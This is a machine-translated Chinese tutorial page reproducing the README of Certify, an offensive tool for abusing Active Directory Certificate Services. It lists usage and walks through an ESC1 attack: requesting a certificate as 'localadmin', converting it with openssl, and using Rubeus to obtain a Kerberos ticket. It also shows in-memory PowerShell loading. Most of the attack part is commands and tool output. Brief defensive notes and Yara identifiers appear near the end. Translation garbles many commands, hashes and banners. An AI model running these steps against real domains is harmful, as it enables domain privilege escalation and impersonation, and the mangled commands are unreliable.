# Certify : Active Directory 证书滥用

> 原文：<https://kalilinuxtutorials.com/certify/>

[![](img/c2d081cb5c2fe7c11c7739905958d7df.png)](https://1.bp.blogspot.com/-xP01PvAxEqI/YVcLIYsS5SI/AAAAAAAALAA/Loz2tevh0ZsAP0pdL5Mg5lLR_9ktah05wCLcBGAsYHQ/s503/download%2B%25281%2529%2B%25281%2529.png)

**Certify** 是一个 C#工具，用于列举和滥用活动目录证书服务(AD CS)中的错误配置。

**用途**

**C:\ Tools>Certify.exe
*_ _ _ _ _ _/*| |(*)/*/
| ^ _ _*|*_ _
| |/_ \ ' |*| |*|/|*| | |*| |*|*_*| _*|*/
v1.0.0
查找所有已注册 ca 的信息:
Certify.exe ca[/ca:SERVER \ ca-name |/domain:domain . local |/path:CN = Configuration，DC=domain，DC = local][/hideAdmins][/showall permissions][/skipWebServiceChecks][/quiet]
查找所有已启用的证书模板:
Certify.exe 查找[/ca:SERVER \ ca-name |/domain:domain . local |/path:CN = Configuration，DC=domain，DC /path:CN=Configuration，DC=domain，DC=local] [/quiet]
查找启用了 ENROLLEE _ SUPPLIES _ SUBJECT 的已启用证书模板:
Certify.exe 查找/enroluesupplies SUBJECT[/ca:SERVER \ ca-name |/domain:domain . local |/path:CN = Configuration，DC=domain，DC=local] [/quiet]
查找能够进行客户端身份验证的已启用证书模板:
Certify.exe 查找/client auth[/ca:SERVER \ ca-name |/domain:domain . local |/domain 并且不显示横幅消息:
Certify.exe Find/showall permissions/quiet[/CA:COMPUTER \ CA _ NAME |/domain:domain . local |/path:CN = Configuration，DC=domain，DC=local]
查找所有启用的证书模板并输出到一个 json 文件:
Certify.exe Find/JSON/outfile:C:\ Temp \ out . JSON[/CA:COMPUTER \ CA _ NAME |/domain:domain . local |/path:CN = Configuration，DC=domain，DC = local]【T37
使用当前计算机上下文请求新证书:
Certify.exe 请求/ca:SERVER \ ca-name/machine[/subject:X][/template:Y][/install]
使用当前用户上下文请求新证书，但使用备用名称(如果支持):
Certify.exe 请求/ca:SERVER\ca-name /template:Y/altname:USER
使用注册代理证书代表另一个用户请求新证书:
Certify.exe 请求/ca:SERVER \ ca-name/template***

**使用请求的证书**

证书可以转换成。pfx 可与以下认证一起使用:

**OpenSSL pkcs12-in cert . PEM-keyex-CSP " Microsoft Enhanced Cryptographic Provider v 1.0 "-export-out cert . pfx**

证书可与 Rubeus 一起使用，以申请具有以下内容的 TGT:

**Rubeus.exe asktgt/用户:X/证书:C:\ Temp \ cert . pfx/密码:**

**示例演练**

首先，使用 Certify.exe 查看是否有任何易受攻击的模板:

**C:\Temp>Certify.exe find /vulnerable
*_ _ _ /* | | | (*)/* |
| | _ _ | |_ *| |* _ _
| | / _ \ ‘| | | *| | | | | |*| / | | |*| | | | |*| | _**_|*| _*|*|*| __, |
/ | |_./
v1.0.0
[*] Action: Find certificate templates [*] Using the search base ‘CN=Configuration,DC=theshire,DC=local’
[*] Restricting to CA name : dc.theshire.local\theshire-DC-CA [*] Listing info about the Enterprise CA ‘theshire-DC-CA’
Enterprise CA Name : theshire-DC-CA
DNS Hostname : dc.theshire.local
FullName : dc.theshire.local\theshire-DC-CA
Flags : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
Cert SubjectName : CN=theshire-DC-CA, DC=theshire, DC=local
Cert Thumbprint : 187D81530E1ADBB6B8B9B961EAADC1F597E6D6A2
Cert Serial : 14BFC25F2B6EEDA94404D5A5B0F33E21
Cert Start Date : 1/4/2021 10:48:02 AM
Cert End Date : 1/4/2026 10:58:02 AM
Cert Chain : CN=theshire-DC-CA,DC=theshire,DC=local
UserSpecifiedSAN : Disabled
CA Permissions :
Owner: BUILTIN\Administrators S-1-5-32-544
Access Rights Principal
Allow ManageCA, ManageCertificates BUILTIN\Administrators S-1-5-32-544
Allow ManageCA, ManageCertificates THESHIRE\Domain Admins S-1-5-21-937929760-3187473010-80948926-512
Allow ManageCA, Read, Enroll THESHIRE\Domain Users S-1-5-21-937929760-3187473010-80948926-513
[!] Low-privileged principal has ManageCA rights!
Allow Enroll THESHIRE\Domain Computers S-1-5-21-937929760-3187473010-80948926-515
Allow ManageCA, ManageCertificates THESHIRE\Enterprise Admins S-1-5-21-937929760-3187473010-80948926-519
Allow ManageCertificates, Enroll THESHIRE\certmanager S-1-5-21-937929760-3187473010-80948926-1605
Allow ManageCA, Enroll THESHIRE\certadmin S-1-5-21-937929760-3187473010-80948926-1606
Enrollment Agent Restrictions :
Everyone S-1-1-0
Template :
Targets :
Everyone S-1-1-0
Everyone S-1-1-0
Template : User
Targets :
Everyone S-1-1-0
Vulnerable Certificates Templates :
CA Name : dc.theshire.local\theshire-DC-CA
Template Name : User2
Validity Period : 2 years
Renewal Period : 6 weeks
msPKI-Certificates-Name-Flag : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
mspki-enrollment-flag : INCLUDE_SYMMETRIC_ALGORITHMS, PEND_ALL_REQUESTS, PUBLISH_TO_DS, AUTO_ENROLLMENT
Authorized Signatures Required : 0
pkiextendedkeyusage : Client Authentication, Smart Card Logon
Permissions
Enrollment Permissions
Enrollment Rights : THESHIRE\Domain Admins S-1-5-21-937929760-3187473010-80948926-512
THESHIRE\Enterprise Admins S-1-5-21-937929760-3187473010-80948926-519
All Extended Rights : THESHIRE\Domain Users S-1-5-21-937929760-3187473010-80948926-513
Object Control Permissions
Owner : THESHIRE\localadmin S-1-5-21-937929760-3187473010-80948926-1000
Full Control Principals : THESHIRE\Domain Users S-1-5-21-937929760-3187473010-80948926-513
WriteOwner Principals : NT AUTHORITY\Authenticated UsersS-1-5-11
THESHIRE\Domain Admins S-1-5-21-937929760-3187473010-80948926-512
THESHIRE\Domain Users S-1-5-21-937929760-3187473010-80948926-513
THESHIRE\Enterprise Admins S-1-5-21-937929760-3187473010-80948926-519
WriteDacl Principals : NT AUTHORITY\Authenticated UsersS-1-5-11
THESHIRE\Domain Admins S-1-5-21-937929760-3187473010-80948926-512
THESHIRE\Domain Users S-1-5-21-937929760-3187473010-80948926-513
THESHIRE\Enterprise Admins S-1-5-21-937929760-3187473010-80948926-519
WriteProperty Principals : NT AUTHORITY\Authenticated UsersS-1-5-11
THESHIRE\Domain Admins S-1-5-21-937929760-3187473010-80948926-512
THESHIRE\Domain Users S-1-5-21-937929760-3187473010-80948926-513
THESHIRE\Enterprise Admins S-1-5-21-937929760-3187473010-80948926-519
CA Name : dc.theshire.local\theshire-DC-CA
Template Name : VulnTemplate
Validity Period : 3 years
Renewal Period : 6 weeks
msPKI-Certificates-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
mspki-enrollment-flag : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
Authorized Signatures Required : 0
pkiextendedkeyusage : Client Authentication, Encrypting File System, Secure Email
Permissions
Enrollment Permissions
Enrollment Rights : THESHIRE\Domain Admins S-1-5-21-937929760-3187473010-80948926-512
THESHIRE\Domain Users S-1-5-21-937929760-3187473010-80948926-513
THESHIRE\Enterprise Admins S-1-5-21-937929760-3187473010-80948926-519 Object Control Permissions
Owner : THESHIRE\localadmin S-1-5-21-937929760-3187473010-80948926-1000
WriteOwner Principals : THESHIRE\Domain Admins S-1-5-21-937929760-3187473010-80948926-512
THESHIRE\Enterprise Admins S-1-5-21-937929760-3187473010-80948926-519
THESHIRE\localadmin S-1-5-21-937929760-3187473010-80948926-1000
WriteDacl Principals : THESHIRE\Domain Admins S-1-5-21-937929760-3187473010-80948926-512
THESHIRE\Enterprise Admins S-1-5-21-937929760-3187473010-80948926-519
THESHIRE\localadmin S-1-5-21-937929760-3187473010-80948926-1000
WriteProperty Principals : THESHIRE\Domain Admins S-1-5-21-937929760-3187473010-80948926-512
THESHIRE\Enterprise Admins S-1-5-21-937929760-3187473010-80948926-519
THESHIRE\localadmin S-1-5-21-937929760-3187473010-80948926-1000
Certify completed in 00:00:00.6548319**

鉴于上述结果，我们有以下三个问题:

*   `**THESHIRE\Domain Users**`对 **`dc.theshire.local\theshire-DC-CA`** CA (ESC7)拥有 **ManageCA** 权限
    *   这意味着任何人都可以在 CA 上翻转 EDITF_ATTRIBUTESUBJECTALTNAME2 标志。
*   `**THESHIRE\Domain Users**`完全控制**用户 2** 模板(ESC4)
    *   这意味着任何人都可以翻转该模板上的**CT _ FLAG _ enrolee _ SUPPLIES _ SUBJECT**标志，并删除 **PEND_ALL_REQUESTS** 发布要求。
*   **`THESHIRE\Domain Users`** 可以在 **VulnTemplate** 模板中注册，该模板可用于客户端认证，具有 ENROLLEE _ SUPPLIES _ SUBJECT 集合(ESC1)
    *   这允许任何人在此模板中注册，并指定一个任意的主题替代名称(如阿达)。

我们将展示场景 3 的滥用。

接下来，让我们为这个模板/CA 请求一个新证书，指定阿达`**localadmin**`作为备用主体:

**C:\ Temp>Certify.exe 请求/CA:DC . the shire . local \ the shire-DC-CA/template:VulnTemplate/altname:local admin
*_ _ _ _ _ _/*| |(*)/*|
| | ^ _ ^ _ ^*|*|
|/_ \ ' | |*| |*|/|*|*/
v1.0.0
[ *]操作:请求 a 证书[* ]当前用户上下文:THESHIRE\harmj0y
[ *]未指定主题名称，使用当前上下文作为主题。[*]Template:VulnTemplate
[*]Subject:CN = harmj 0y，OU=TestOU，DC=theshire，DC = local[*]AltName:local admin
[*]证书颁发机构:DC . The shire . local \ The shire-DC-CA[*]CA 响应:证书已颁发。
[*]Request ID:337[*]cert . PEM:
——BEGIN RSA 私钥——
miiepaibaakcaqean 8 bkuwcyj 8…
——END RSA 私钥—
——BEGIN 证书—
miigtcbqmawibagitvqaaav…
——END 证书——
[*]转换为:openssl**

将`**-----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----**`部分复制到 Linux/macOS 上的一个文件中，运行 openssl 命令将其转换为. pfx，出现提示时，不要输入密码:

**(基础)笔记本电脑:~ harmj 0y $ OpenSSL pkcs12-in cert . PEM-keyex-CSP " Microsoft Enhanced Cryptographic Provider v 1.0 "-Export-out cert . pfx
输入导出密码:
验证-输入导出密码:
(基础)笔记本电脑:~ harmj0y$**

最后，将 cert.pfx 移动到您的目标机器文件系统(手动或通过 Cobalt Strike)，并使用 Rubeus 为`**altname**`用户请求一个 TGT:

**C:\ Temp>Rubeus.exe asktgt/user:local admin/certificate:C:\ Temp \ cert . pfx
*_ _(*\ | |
*)_*| |**_*| _*/| | | | _ | _ | | |/*)| \ | | | |)| |*| |*| |*| |*|/|/|*)**/(_/
v 1 . 6 . 1
【*】动作:用 etype rc4_hmac 和 subject 询问 TGT[*]PKINIT:CN = harmj 0y，OU=TestOU，DC=theshire，DC = local
[*]Building AS-AS [*]base64(ticket . kir bi):
doIFujCCBbagAwIBBaEDAgEWooIExzCC……(snip)……
service name:krbtgt/the shire . local
service realm:the shire。本地
用户名:本地管理员
用户领域:THESHIRE。本地
开始时间:2/22/2021 下午 2:06:51
结束时间:2/22/2021 下午 3:06:51
更新截止时间:3/1/2021 下午 2:06:51
标志:name_canonicalize，pre_authent，initial，renewable，forwardable
key type:RC4 _ hmac
Base64(key):etb 5 wpf wembszr 2+**

**防守注意事项**

Certify 在 Black Hat 2021 上发布，我们的“Certified [](https://www.blackhat.com/us-21/briefings/schedule/#certified-pre-owned-abusing-active-directory-certificate-services-23168)Pre-Owned:滥用活动目录证书服务”讲座。

当前 Certify 代码库的 TypeRefHash 为**f 9 dbbfe 2527 e 1164319350 c 0 b 0900 c 58 be 57 a 46 c 53 ffef 31699 ed 116 a 765995 a**。

Certify 的 TypeLib GUID 为**64524 ca 5-e4d 0-41 B3-ACC 3-3 BD befd 40 c 97**。这反映在当前回购协议中的 Yara 规则中。

再见

**编译指令**

我们不打算为 Certify 发布二进制文件，所以你必须自己编译🙂

认证是针对。NET 4.0 并兼容 Visual Studio 2019 社区版。只需打开项目。sln，选择“发布”，构建。

**旁注:通过 PowerShell 运行 Certify】**

如果您想通过 PowerShell 包装运行 Certify in-memory，首先编译 Certify 并对结果程序集进行 base64 编码:

**[Convert]::to base 64 string([IO。File]::read all bytes(" C:\ Temp \ certify . exe ")|文件外编码 ASCII C:\Temp\Certify.txt**

然后，Certify 可以用以下内容加载到 PowerShell 脚本中(其中“aa…”替换为 base64 编码的 Certify 程序集字符串):

**$CertifyAssembly = [System。reflection . Assembly]::Load([Convert]::from base 64 string(" aa…))**

然后可以调用 Main()方法和任何参数，如下所示:

#### 旁注:在 psremoting 上运行 certify

由于 PSRemoting 处理输出的方式，我们需要将 stdout 重定向到一个字符串并返回它。幸运的是，Certify 有一个功能可以帮助解决这个问题。

如果您按照 side note:run Certify Through PowerShell 中的说明创建 Certify.ps1，请在脚本中添加如下内容:

**倒影**

在公开披露方面，我们在发布白皮书后的大约 45 天内自行禁止发布我们的攻击性工具(Certify 和 ForgeCert ),以便让组织有机会了解有关 Active Directory 证书服务的问题。我们还先发制人地为这两个项目发布了一些 Yara 规则/IOC，并发布了侧重于防御的 PSPKIAudit PowerShell 项目以及白皮书。然而，我们发现，组织和供应商在历史上通常不会修复问题或建立对“理论”攻击的检测，直到有人通过概念证明证明某些事情是可能的。

[**Download**](https://github.com/GhostPack/Certify)